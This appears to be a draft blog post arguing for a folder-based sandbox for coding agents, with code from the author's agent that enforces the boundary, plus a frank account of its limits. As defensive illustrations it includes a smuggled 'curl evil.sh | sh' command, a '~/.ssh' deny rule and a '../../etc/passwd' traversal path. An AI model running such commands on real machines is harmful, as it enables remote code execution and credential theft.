---
title: 'The whole permission model is one folder'
description: 'A coding-agent sandbox with one primitive: read anywhere, write inside the folder — enforced in code, not in the prompt.'
pubDate: 2026-06-11
tags: [agents, effect, ux]
draft: true
---

Every coding agent ships, somewhere in its design, an answer to the only security question users actually ask: *what can this thing do to my machine?* The answers on offer are mostly either a configuration language or a virtual machine — a grid of capabilities to curate, or a container to maintain. Both are real answers. Both also fail the same test: when you grant something, can you predict what you just granted?

There's a third answer, and it's almost embarrassingly small: a directory. The agent reads anywhere, and writes — files *and* shell — inside one folder. No matrix, no rules file, no image to build. One primitive, one check, and a line that the user, the model, and the filesystem all understand the same way.

This post sells that design. The receipts come from [efferent](https://github.com/xandreeddev/agent), the coding agent I'm building in the open — its sandbox is exactly this folder line, and every snippet below is lifted from it (simplified for reading; the shapes are real).

## Four ways to draw the line

A **permission model** is the contract between an agent and the machine it runs on: which operations execute silently, which stop to ask a human, and which are refused outright. Four families dominate the coding-agent space.

**Command allow-lists.** A list of permitted shell commands or patterns — `npm test` runs, `git push` asks, everything unknown asks. The UX cost is prompt fatigue: a productive agent runs dozens of commands per task, and every novel one interrupts you. The implementation cost is an arms race, because shell is an open grammar. Is `npm test` the same command as `npm test; curl evil.sh | sh`? Matching commands safely means *parsing* commands, and now you maintain a shell parser whose failure mode is a security hole. Users end up curating regexes, which is a job nobody wanted.

**Capability matrices.** The generalization: tools on one axis, resources on the other, a verdict in each cell. Something like:

```json
{
  "permissions": {
    "fs.read":  { "allow": ["**/*"], "deny": ["~/.ssh/**"] },
    "fs.write": { "allow": ["src/**", "test/**"], "ask": ["**/*.config.*"] },
    "shell":    { "allow": ["npm test", "git status"], "ask": ["git push"] },
    "network":  { "ask": ["*"] }
  }
}
```

Maximally expressive, and that's the problem. Every glob is a tiny program the user has to mentally execute to know what they granted; every gap between globs is a corner the model will eventually find. In practice users converge on one of two configurations: allow-all (because the prompts wore them down) or the default (which they never audited). An expressive policy language that nobody can predict is indistinguishable from no policy.

**Containers and VMs.** The honest heavyweight: run the agent inside an isolated filesystem and the kernel enforces everything. This is the right answer when the input is hostile — autonomous fleets chewing on untrusted issues. As a *default* for interactive work it taxes every session: your toolchain has to exist inside the image, credentials have to be plumbed in, file sync has to be solved, and "works in the container" becomes its own bug class. Isolation this strong is bought with environment drift.

**The folder.** Here is the sentence actually in a user's head when they start an agent: *it can touch this project.* Not "it may write paths matching `src/**`," not "it has capabilities X, Y, and a network broker" — *this project, this directory*. A folder is the unit people already organize trust around; it's why you felt fine running the agent in `~/scratch/demo` and paused before running it in `~/work/monorepo`. A permission model built on the directory inherits that intuition for free: the UX cost is zero, because choosing the folder is something you did anyway by launching the agent there, and the implementation cost is a path comparison.

The rest of this post is what it takes to make that one primitive actually hold.

## The asymmetry that makes one primitive enough

A single folder line only works because of an insight that's easy to state and easy to under-appreciate: **reads and writes are not symmetric, so they don't deserve symmetric rules.**

Reading widely is how an agent builds understanding. Confine reads to the granted folder and you get worse code, not safer code: an agent working in `packages/adapters` needs the port interfaces in `packages/core`, the conventions in sibling packages, the lockfile at the root. Reads are also cheap to allow, because reading can't destroy anything — it can't break a build, lose an afternoon of work, or corrupt a repo. (Reads aren't *risk-free* — a read can surface secrets, which is why exfiltration controls belong on network egress, not on `read_file` — but the destructive blast radius of an agent lives entirely on the write side.)

Writes are where the damage is. A wrong write costs you work; a wrong `rm -rf` in the wrong working directory costs you a repository. So the rule is asymmetric on purpose: **reads range over everything; writes and bash are confined to the folder.**

In [efferent](https://github.com/xandreeddev/agent), that entire policy is one value — the `ScopeBinding`:

```ts title="packages/core/src/usecases/codingToolkit.ts"
export interface ScopeBinding {
  /** Absolute path; writes + bash are confined here when `enforceWrite`. */
  readonly rootDir: string
  /** Absolute anchor for path resolution + relative display (workspace root). */
  readonly displayRoot: string
  /** Reject `write_file`/`edit_file` outside `rootDir`. False for the root. */
  readonly enforceWrite: boolean // [!code highlight]
  /** Allow the `bash` tool at all. */
  readonly allowBash: boolean
}
```

Four fields, and that's the whole permission model. `rootDir` is the line. `displayRoot` is the workspace root — the anchor relative paths resolve against and the base every tool result renders paths relative to, so the model always reads and writes workspace-relative paths no matter which scope it's in. `enforceWrite` arms the check. `allowBash` is the shell's master switch, which we'll get to.

Notice what the doc comment says about the root: `enforceWrite` is `false` for the top-level agent, whose `rootDir` *is* the workspace. That's not a hole — it's the grant. Launching the agent in a directory is the human saying "this project"; the folder you `cd`'d into is the permission ceremony. Everything below the root — every sub-agent — runs with the check armed.

## Guidance in the prompt, law at the seam

Quick vocabulary, because the enforcement point matters. In a ports-and-adapters codebase, a **port** is an interface the core declares (`FileSystem`, with `read`/`write`/`list`), and an **adapter** is the implementation living at the edge (the one that actually calls `node:fs`). A **tool handler** is the function that runs when the model invokes a tool — the single seam between "the model emitted a `write_file` call" and "bytes change on disk."

That seam is where the line is enforced. The model has no other route to the filesystem: every file operation it can express funnels through a handler, and the handlers close over a `ScopeBinding`. The check itself is two small functions:

```ts title="packages/core/src/usecases/codingToolkit.ts"
/**
 * True when `path` lives inside `rootDir` (or *is* `rootDir`). Uses
 * `path.sep` so `/foo/bar` isn't considered inside `/foo/bar-other`.
 */
const isWithinScope = (path: string, rootDir: string): boolean => {
  const root = rootDir.endsWith(sep) ? rootDir : rootDir + sep
  return path === rootDir || path.startsWith(root)
}

const rejectIfOutOfScope = (abs: string) =>
  enforceWrite && !isWithinScope(abs, rootDir)
    ? Effect.fail({
        error: 'OutOfScope', // [!code highlight]
        message: `${displayPath(displayRoot, abs)} is outside this scope (${displayPath(displayRoot, rootDir)}). Defer it to the parent in your summary.`,
      })
    : Effect.void
```

And every mutating file tool runs it before touching the port:

```ts title="packages/core/src/usecases/codingToolkit.ts"
write_file: ({ path, content }) =>
  Effect.gen(function* () {
    const abs = resolvePath(displayRoot, path)
    yield* rejectIfOutOfScope(abs) // [!code highlight]
    yield* fs.write(abs, content)
    // …
  }),
```

`read_file`, `grep`, `glob`, and `ls` have no such line — reads anywhere, by construction. The asymmetry from the last section isn't a policy entry; it's which handlers call the function.

Two details of the check are worth being precise about, because they're exactly what the code does and no more. First, **resolution**: a relative path is resolved against `displayRoot` with Node's `resolve`, which collapses `.` and `..` segments before the comparison — so `../../etc/passwd` normalizes to wherever it actually points and fails the check honestly. Second, **the separator guard**: the prefix test appends `path.sep` before comparing, so `/ws/packages/core-utils` is not "inside" `/ws/packages/core`. String-prefix sandboxes that skip this are a classic bug.

Why does the check live in the handler rather than the adapter? Because the binding is *per-call data*, not per-process state. The same `FileSystem` adapter — one `LocalFileSystemLive`, scope-agnostic, no idea sandboxes exist — serves every agent in the tree; what varies is the `ScopeBinding` each handler set closed over. That's what makes the sandbox cheap enough to apply per sub-agent spawn, which is the payoff two sections down.

And here's the part I'd put on a poster. The system prompt tells the model about the line too — but as a briefing, not a mechanism:

```ts title="packages/core/src/prompts/coder.ts"
`You can **only write inside your scope**. write_file or edit_file on a path
outside ${args.rootDir} returns a structured '{ error: "OutOfScope", ... }'
tool result. Treat that as a constraint, not a bug: if the work requires // [!code highlight]
writing outside, say so in your final summary and let the parent decide.`
```

Prompt rules are guidance: a model can forget them, misread them, or be argued out of them by something it read in a file. Port-level checks are law: there is no token sequence that talks its way past a string comparison. The prompt's job is to make the law *unsurprising* — so when the model hits the line, it recognizes the situation and already knows the protocol. Which brings us to what the line says when you hit it.

## OutOfScope is feedback, not punishment

Every tool in [efferent](https://github.com/xandreeddev/agent)'s toolkit declares `failureMode: 'return'` — a failed tool call comes back to the model as a structured result, not an exception that kills the turn (the full failure-string philosophy is a post of its own). So an out-of-scope write isn't a crash; it's a message. Concretely, a sub-agent scoped to `packages/adapters` that tries to edit a core file gets:

> `write_file` → `{ error: 'OutOfScope', message: 'packages/core/src/ports/FileSystem.ts is outside this scope (packages/adapters). Defer it to the parent in your summary.' }`

Read that string as documentation, because it was written for a model to act on. It has three moving parts:

1. **Where you tried to go** — the offending path, rendered workspace-relative so it matches every other path the model has seen this session.
2. **Where the line is** — `outside this scope (packages/adapters)` restates the boundary in the moment it matters, which beats hoping the model retained it from the system prompt eighty turns ago.
3. **What to do instead** — `Defer it to the parent in your summary.` Not "permission denied." A recovery protocol: finish what you *can* do, and report the out-of-scope work upward so the orchestrating agent can route it.

The prompt closes the loop from its side — `An OutOfScope error means you must defer that part to the parent — keep going on what you can do.` In practice that's exactly what happens: the sub-agent finishes its in-scope edits and its one-line summary ends with something like "the port interface in core also needs a new method — deferred to you." The hard wall and the soft guidance are the same sentence said twice, once as enforcement and once as expectation. That redundancy is the design: rules the model has internalized produce *zero* failed calls on the happy path, and the wall is there for the day internalization fails.

## Bash, honestly

Files were the easy half. The `Bash` tool is where every folder sandbox has to either get honest or start lying, so here's the real handler:

```ts title="packages/core/src/usecases/codingToolkit.ts"
Bash: ({ command, timeout }) =>
  Effect.gen(function* () {
    if (!allowBash) {
      return yield* Effect.fail({
        error: 'BashNotAllowed',
        message: 'bash execution is disabled in this mode — re-run with --allow-bash to enable',
      })
    }
    // Human approval; a denial returns as data the model reads and adjusts to.
    const decision = yield* approval.request({
      tool: 'Bash',
      summary: command,
      cwd: rootDir,
      ruleKey: bashRuleKey(command),
    })
    if (decision.kind === 'deny') {
      return yield* Effect.fail({ error: 'Denied', message: /* … */ })
    }
    const r = yield* shell.exec({
      command,
      cwd: rootDir, // [!code highlight]
      timeoutMs: timeout ?? 60_000,
    })
    // …
  }),
```

The highlighted line is the folder doing its bash duty: every command executes with its **working directory set to the scope folder**. A sub-agent scoped to `packages/adapters` that runs `bun test` tests its own package; relative paths in every command land inside the line by default. For the overwhelming majority of what agents actually run — builds, tests, typechecks, git status — cwd-binding *is* the sandbox, because those commands are relative-path creatures.

Now the honest part: **cwd is a default, not a wall.** A shell can `cd /` as its first word. It can name absolute paths. It can invoke a script that does either. There is no path check that confines a Turing-complete command language short of interpreting it — which is the allow-list arms race from the top of this post — or jailing the process, which is the container. A folder sandbox that claims its bash is path-confined is lying to you.

The system prompt is carefully worded on exactly this point, and the precision is deliberate:

> Your **bash runs with cwd = your scope dir** — use it for tests/builds/checks local to your package. It can't write through the file tools outside your scope.

*Through the file tools.* The prompt claims the hard guarantee only where the hard guarantee exists. Bash gets different machinery, layered, with each layer guaranteeing only what it can:

- **The `allowBash` switch** — static, binary, decided before the model says a word. Headless modes run with bash off unless explicitly flagged on. Guarantee: absolute, because a tool that fails before approval can't execute anything.
- **The approval port** — every command passes a human-consent boundary before it executes. In the interactive TUI a fast LLM judge pre-screens requests against the permitted folders so that ordinary in-folder work doesn't prompt at all (how it reasons about "ordinary" is a post of its own); anything it isn't sure about — and any judge error — falls back to the modal. Guarantee: a human or an explicit standing rule saw every command class; the judge can remove prompts, never reviews.
- **The fs-port check** — the previous section's law. Guarantee: the *file tools* cannot write outside the line, ever, deterministically.

Three layers, three different strengths, and no single one pretending to be the whole story. The file-tool check is law because it can be. The bash story is consent because that's what's actually enforceable for shell without buying a container. Writing that down plainly beats implying a guarantee the code can't keep.

## Sub-agents inherit the line

The sandbox earns its keep when agents start spawning agents. [efferent](https://github.com/xandreeddev/agent)'s delegation is one generic tool — `run_agent({ name, folder, task })` — whose own description tells the model the deal: the spawned agent "reads anywhere but writes/runs bash only inside that folder." Mechanically, a spawn is just a fresh binding:

```ts title="packages/core/src/usecases/buildScopeRuntime.ts"
const binding: ScopeBinding = {
  rootDir: folder, // [!code highlight]
  displayRoot,
  enforceWrite: true,
  allowBash: opts.allowBash ?? true,
}
// …same tools, rebound to this folder for this run
const childLayer = genericToolkit.toLayer(
  buildGenericHandlers(binding, opts, hooks, locks),
)
```

Same toolkit at every depth, same handlers, same prompts modulo the scope header — the only thing that varies between the root agent and a grandchild three folders deep is four fields of data. This is the payoff of enforcing at the handler seam instead of inside the adapter or the process: a sandbox that's per-call data costs nothing to apply per spawn. No container boots, no filesystem overlays — a child's entire confinement is constructed in the time it takes to build an object literal.

The composition consequence is the good kind of boring: a parent that fans three sub-agents out into three *disjoint* folders gets non-colliding writes **by construction** — their write sets can't intersect, because each set is bounded by a folder the others can't touch (same-folder spawns serialize on a per-folder lock; the full spawn semantics — seeding, budgets, the persisted context tree — are a post of its own). And if a folder carries a `SCOPE.md`, its body rides along as ambient context for whoever runs there — discovery details likewise a post of its own.

One inheritance detail that's easy to miss: `displayRoot` stays the workspace root all the way down. Every agent in the tree resolves and reports paths against the same anchor, so when a child's `OutOfScope` message says `packages/core/src/ports/FileSystem.ts`, the parent reading that summary knows exactly which file is meant — no per-scope coordinate systems to translate between.

## What the folder line doesn't give you

Tradeoffs, plainly.

**Folder granularity is coarse.** There are no per-file rules inside the line. You can't grant `packages/adapters` *except* `.env`, or make one file read-only. The bet is that finer-grained write rules are precisely the capability matrix this design refuses — and that secrets belong out of the tree, not defended by glob. If your threat model needs per-file write policy, this primitive alone won't carry it.

**The check is lexical.** `isWithinScope` tests the path *string* — resolved and separator-guarded, as described above, but never `realpath`'d. A symlink inside the scope that points outside passes the check, and the OS follows it. Traversal via `..` is handled (resolution collapses it before the comparison); symlink indirection is not. That's the exact, honest extent of it.

**Shell is consent, not confinement.** Said in full above, repeated here because tradeoff sections are where claims go to get audited: the deterministic write guarantee covers the file tools only. Bash is cwd-shaped and approval-gated, with a human in the loop and a judge in front to keep the loop humane. The fs-port check is one layer of several, and the layering is the design, not an apology for it.

**The grant is the whole folder.** When you approve a folder, you approve all of it — and the standing grant for the workspace is implicit in where you launched. For interactive use that implicitness is the feature. For higher-stakes settings it's a known limit, and the roadmap reflects it: extending the same rule-keyed consent that bash uses to out-of-scope writes and network egress is queued work, not a solved problem.

**Reads-anywhere is a bet, not a theorem.** Wide reads trade a privacy surface for code quality, and the trade only stays good while egress is controlled. An agent that can read anything and silently `web_fetch` anywhere would be an exfiltration kit; the read asymmetry leans on the network tools staying narrow and visible.

If those bullets read like reasons to use a container — sometimes they are. Hostile inputs, unattended fleets, regulated trees: pay the isolation tax. The folder line is the right default for the other ninety-five percent of sessions, and it composes *with* a container on the day you need both.

## Pick the primitive people can hold

Permission systems get evaluated on expressiveness, which is the wrong axis. The capability matrix can express everything and predicts nothing; the user staring at a glob grid cannot answer "what did I just allow?" — so they allow everything, and the most expressive policy language in the world enforces nothing at all. **A permission model is only as strong as the user's ability to predict their own grants.**

A directory is the rare boundary that every party in the system understands identically. The user thinks "this project." The model reads `Your scope: packages/adapters` and a failure string that names the line. The code runs a prefix check that is right or wrong with no middle. There's no translation layer where the user's intent and the enforced reality drift apart — and that translation layer is where every config-language sandbox quietly dies.

So my position, having shipped this: don't start from "what policies might someone want to express?" Start from the sentence already in your user's head, find the one primitive that sentence names, and enforce it where the model can't argue — in the handler, as data, with a failure string that teaches. Reads anywhere. Writes inside the line. Everything subtler than that is a layer you add with your eyes open, not a grid you make the user fill in.

The folder was already the unit of trust. The whole trick is refusing to invent a second one.
